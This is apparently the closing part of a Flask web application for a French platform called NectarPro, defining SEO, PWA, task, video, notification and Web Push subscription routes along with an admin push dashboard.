print("exists =", os.path.exists(static_path))
print("isdir =", os.path.isdir(static_path))
if os.path.exists(static_path):
    print("contenu =", os.listdir(static_path))
print("=" * 60)

# TEST ECRITURE DANS STATIC AU DEMARRAGE
test_path = os.path.join(app.root_path, "static", "startup_test.txt")
try:
    with open(test_path, "w", encoding="utf-8") as f:
        f.write("startup test")
    print("TEST ECRITURE OK :", test_path)
except Exception as e:
    print("TEST ECRITURE ECHEC :", e)

# Routes SEO - Sitemap et Robots.txt (servis à la racine)
from flask import send_from_directory

@app.route('/sitemap.xml')
def serve_sitemap():
    """Sert le sitemap.xml à la racine pour Google Search Console"""
    return send_from_directory('static', 'sitemap.xml', 
        mimetype='application/xml; charset=utf-8')

@app.route('/robots.txt')
def serve_robots():
    """Sert le robots.txt à la racine"""
    return send_from_directory('static', 'robots.txt', 
        mimetype='text/plain; charset=utf-8')

@app.route('/manifest.json')
def serve_manifest():
    """Sert le manifest PWA à la racine"""
    return send_from_directory('static', 'manifest.json',
        mimetype='application/manifest+json; charset=utf-8')

@app.route('/taches')
def taches_page():
    """Route Tâches - import lazy pour éviter l'import circulaire"""
    from tasks import taches_page as _taches_page
    return _taches_page()

@app.route('/api/share-task', methods=['POST'])
def api_share_task_route():
    """API share task - import lazy pour éviter l'import circulaire"""
    from tasks import api_share_task
    return api_share_task()

@app.route('/api/claim-task-reward', methods=['POST'])
def api_claim_task_reward_route():
    """API claim task reward - import lazy pour éviter l'import circulaire"""
    from tasks import api_claim_task_reward
    return api_claim_task_reward()

@app.route('/admin/taches', methods=['GET', 'POST'])
def admin_taches_route():
    """Admin tâches - import lazy pour éviter l'import circulaire"""
    from tasks import admin_taches
    return admin_taches()

@app.route('/videos')
@login_required
def videos_nectarpro():
    """Page vidéos NectarPro - affiche les vidéos de la plateforme"""
    import os as _os
    vlogs_dir = _os.path.join(app.root_path, 'static', 'vlogs')
    videos = []
    if _os.path.exists(vlogs_dir):
        for f in sorted(_os.listdir(vlogs_dir), reverse=True):
            if f.lower().endswith(('.mp4', '.mov', '.webm', '.avi', '.mkv')):
                nom = f.rsplit('.', 1)[0].replace('_', ' ').replace('-', ' ')
                videos.append({
                    'filename': f,
                    'url': f'/static/vlogs/{f}',
                    'nom': nom,
                    'taille_mo': round(_os.path.getsize(_os.path.join(vlogs_dir, f)) / (1024*1024), 2)
                })
    return render_template('videos_nectarpro.html', videos=videos)

@app.route('/offline')
def offline_page():
    """Page hors connexion pour la PWA NectarPro"""
    return render_template('offline.html')


@app.route('/apple-touch-icon.png')
def apple_touch_icon():
    """Icône Apple touch - fallback"""
    from flask import send_from_directory
    return send_from_directory('static/images', 'icon-192.png')

@app.route('/apple-touch-icon-precomposed.png')
def apple_touch_icon_precomposed():
    """Icône Apple touch precomposed - fallback"""
    from flask import send_from_directory
    return send_from_directory('static/images', 'icon-192.png')

@app.route('/.well-known/assetlinks.json')
def assetlinks():
    """Fichier Digital Asset Links pour Android PWA/TWA"""
    from flask import send_from_directory
    return send_from_directory('.well-known', 'assetlinks.json')




@app.route('/api/push/test', methods=['POST'])
@login_required
def api_push_test():
    """Test : envoie une notification push à l'utilisateur connecté."""
    user = get_logged_in_user()
    notif = send_notification_to_user(
        user.id,
        titre="🔔 Test NectarPro",
        message="Ceci est une notification de test. Si vous la voyez, tout fonctionne !",
        url="/dashboard",
        type="test",
    )
    return jsonify({"success": True, "notification_id": notif.id})


@app.route('/api/push/send', methods=['POST'])
def api_push_send():
    """Route admin : envoie une notification à un utilisateur spécifique."""
    user_admin = get_logged_in_admin()
    if not user_admin:
        return jsonify({"success": False, "message": "Accès refusé"}), 403

    data = request.get_json(silent=True)
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400

    user_id = data.get('user_id')
    titre = data.get('titre', 'Notification')
    message = data.get('message', '')
    url = data.get('url', '/')
    notif_type = data.get('type', 'annonce_admin')

    if not user_id or not message:
        return jsonify({"success": False, "message": "user_id et message requis"}), 400

    notif = send_notification_to_user(
        user_id,
        titre=titre,
        message=message,
        url=url,
        type=notif_type,
    )
    return jsonify({"success": True, "notification_id": notif.id})


@app.route('/api/push/send-all', methods=['POST'])
def api_push_send_all():
    """Route admin : envoie une notification à tous les abonnés."""
    user_admin = get_logged_in_admin()
    if not user_admin:
        return jsonify({"success": False, "message": "Accès refusé"}), 403

    data = request.get_json(silent=True)
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400

    titre = data.get('titre', '📣 Annonce NectarPro')
    message = data.get('message', '')
    url = data.get('url', '/')

    if not message:
        return jsonify({"success": False, "message": "message requis"}), 400

    count = notify_all_users(titre=titre, message=message, url=url, type='annonce_admin')
    return jsonify({"success": True, "envoyes": count})


# ============================================================
# 🔔 ROUTES API NOTIFICATIONS (lecture, historique)
# ============================================================

@app.route('/api/notifications', methods=['GET'])
@login_required
def api_notifications_list():
    """Liste les notifications de l'utilisateur connecté."""
    user = get_logged_in_user()
    page = request.args.get('page', 1, type=int)
    per_page = 20

    notifs = (
        Notification.query
        .filter_by(user_id=user.id)
        .order_by(Notification.date_creation.desc())
        .paginate(page=page, per_page=per_page, error_out=False)
    )

    return jsonify({
        "success": True,
        "notifications": [n.to_dict() for n in notifs.items],
        "total": notifs.total,
        "page": page,
        "pages": notifs.pages,
        "unread": Notification.query.filter_by(user_id=user.id, lu=False).count(),
    })


@app.route('/api/notifications/read/<int:notif_id>', methods=['POST'])
def api_notification_read(notif_id):
    """Marque une notification comme lue."""
    notif = Notification.query.get(notif_id)
    if notif:
        notif.lu = True
        db.session.commit()
    return jsonify({"success": True})


@app.route('/api/notifications/read-all', methods=['POST'])
@login_required
def api_notifications_read_all():
    """Marque toutes les notifications de l'utilisateur comme lues."""
    user = get_logged_in_user()
    Notification.query.filter_by(user_id=user.id, lu=False).update({"lu": True})
    db.session.commit()
    return jsonify({"success": True})


# ============================================================
# 🔔 ROUTES API WEB PUSH VAPID
# ============================================================

@app.route('/api/push/vapid-public-key', methods=['GET'])
def api_push_vapid_public_key():
    """Renvoie la clé publique VAPID au format attendu par le navigateur."""
    import logging
    logger = logging.getLogger("nectarpro.push")
    try:
        pub_key = get_vapid_public_key()
        if not pub_key:
            logger.error("❌ api_push_vapid_public_key: clé publique VAPID introuvable")
            return jsonify({"success": False, "message": "Clé VAPID non configurée"}), 500
        logger.info("✅ Clé publique VAPID servie au client (%d caractères)", len(pub_key))
        return jsonify({"success": True, "publicKey": pub_key})
    except Exception as e:
        logger.error("❌ Erreur récupération clé VAPID: %s", e)
        return jsonify({"success": False, "message": str(e)}), 500


@app.route('/api/push/subscribe', methods=['POST'])
def api_push_subscribe():
    """Enregistre un nouvel abonnement Web Push."""
    import logging
    logger = logging.getLogger("nectarpro.push")
    try:
        data = request.get_json(force=True)
        if not data:
            return jsonify({"success": False, "message": "Données JSON requises"}), 400

        endpoint = data.get('endpoint')
        keys = data.get('keys', {})
        p256dh = keys.get('p256dh')
        auth = keys.get('auth')

        if not endpoint or not p256dh or not auth:
            logger.warning("⚠️ Tentative d'abonnement avec données incomplètes")
            return jsonify({"success": False, "message": "endpoint, keys.p256dh et keys.auth requis"}), 400

        user = get_logged_in_user()
        user_id = user.id if user else None
        user_agent = request.headers.get('User-Agent', '')[:300]
        browser = request.headers.get('Sec-CH-UA', '')[:50] or data.get('browser', 'Inconnu')
        platform = request.headers.get('Sec-CH-UA-Platform', '')[:50] or data.get('platform', 'Inconnu')
        language = request.headers.get('Accept-Language', '')[:10] or data.get('language', '')
        user_timezone = data.get('timezone', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')[:45]

        # Vérifier si l'abonnement existe déjà
        existing = PushSubscription.query.filter_by(endpoint=endpoint).first()
        if existing:
            # Mise à jour
            existing.p256dh = p256dh
            existing.auth = auth
            existing.user_id = user_id or existing.user_id
            existing.browser = browser or existing.browser
            existing.platform = platform or existing.platform
            existing.user_agent = user_agent or existing.user_agent
            existing.language = language or existing.language
            existing.timezone = user_timezone or existing.timezone
            existing.ip = ip or existing.ip
            existing.actif = True
            existing.derniere_utilisation = datetime.now(timezone.utc)
            db.session.commit()
            logger.info("✅ Abonnement push mis à jour pour user_id=%s (endpoint existant)", user_id)
            return jsonify({"success": True, "message": "Abonnement mis à jour", "updated": True})
        else:
            # Nouvel abonnement
            sub = PushSubscription(
                user_id=user_id,
                endpoint=endpoint,
                p256dh=p256dh,
                auth=auth,
                browser=browser,
                platform=platform,
                user_agent=user_agent,
                language=language,
                timezone=user_timezone,
                ip=ip,
                actif=True,
            )
            db.session.add(sub)
            db.session.commit()
            logger.info("✅ Nouvel abonnement push enregistré (id=%d, user_id=%s, navigateur=%s)", sub.id, user_id, browser)
            return jsonify({"success": True, "message": "Abonnement enregistré", "id": sub.id})
    except Exception as e:
        db.session.rollback()
        logger.error("❌ Erreur enregistrement abonnement push: %s", e)
        return jsonify({"success": False, "message": str(e)}), 500


@app.route('/api/push/unsubscribe', methods=['POST'])
def api_push_unsubscribe():
    """Désactive un abonnement Web Push."""
    import logging
    logger = logging.getLogger("nectarpro.push")
    try:
        data = request.get_json(force=True)
        endpoint = data.get('endpoint') if data else None

        if not endpoint:
            return jsonify({"success": False, "message": "endpoint requis"}), 400

        sub = PushSubscription.query.filter_by(endpoint=endpoint).first()
        if sub:
            sub.actif = False
            db.session.commit()
            logger.info("🗑️ Abonnement push désactivé: %s...", endpoint[:80])
        return jsonify({"success": True, "message": "Abonnement désactivé"})
    except Exception as e:
        db.session.rollback()
        logger.error("❌ Erreur désabonnement push: %s", e)
        return jsonify({"success": False, "message": str(e)}), 500


@app.route('/api/push/sync-subscription', methods=['POST'])
def api_push_sync_subscription():
    """Synchronise un abonnement existant (appelé par le SW via Background Sync)."""
    import logging
    logger = logging.getLogger("nectarpro.push")
    try:
        data = request.get_json(force=True)
        endpoint = data.get('endpoint') if data else None

        if not endpoint:
            return jsonify({"success": False, "message": "endpoint requis"}), 400

        sub = PushSubscription.query.filter_by(endpoint=endpoint).first()
        if sub:
            sub.actif = True
            sub.derniere_utilisation = datetime.now(timezone.utc)
            db.session.commit()
            logger.info("✅ Abonnement synchronisé: %s...", endpoint[:80])
        return jsonify({"success": True})
    except Exception as e:
        db.session.rollback()
        logger.error("❌ Erreur sync abonnement: %s", e)
        return jsonify({"success": False, "message": str(e)}), 500


@app.route('/api/push/check-updates', methods=['GET'])
def api_push_check_updates():
    """Vérifie si une mise à jour est disponible (pour Periodic Sync)."""
    return jsonify({"hasUpdate": False, "version": "2.0.0"})


@app.route('/service-worker.js')
def serve_service_worker():
    """Sert le Service Worker avec la clé VAPID injectée."""
    import logging
    logger = logging.getLogger("nectarpro.push")
    try:
        vapid_key = get_vapid_public_key()
        sw_path = os.path.join(app.static_folder, 'service-worker.js')
        if not os.path.exists(sw_path):
            sw_path = os.path.join(os.getcwd(), 'static', 'service-worker.js')
        with open(sw_path, 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace("'{{VAPID_PUBLIC_KEY}}'", f"'{vapid_key}'")
        logger.info("✅ Service Worker servi avec clé VAPID injectée")
        from flask import make_response
        response = make_response(content)
        response.headers['Content-Type'] = 'application/javascript'
        response.headers['Service-Worker-Allowed'] = '/'
        return response
    except Exception as e:
        logger.error("❌ Erreur service worker: %s", e)
        return send_from_directory(app.static_folder, 'service-worker.js')


# ============================================================
# 🔔 ADMIN PUSH DASHBOARD
# ============================================================

@app.route('/admin/push')
def admin_push_dashboard():
    """Dashboard administrateur des notifications push."""
    admin_user = get_logged_in_admin()
    if not admin_user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    stats = get_push_stats()
    return render_template("admin_push.html", user=admin_user, stats=stats)


# ============================================================
# 🔔 INITIALISATION DES TABLES PUSH AU DÉMARRAGE
# ============================================================
with app.app_context():
    try:
        init_push_tables(app)
    except Exception as e:
        print(f"[PUSH] Erreur init tables: {e}")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Render fournit le PORT
    app.run(host="0.0.0.0", port=port, debug=False)
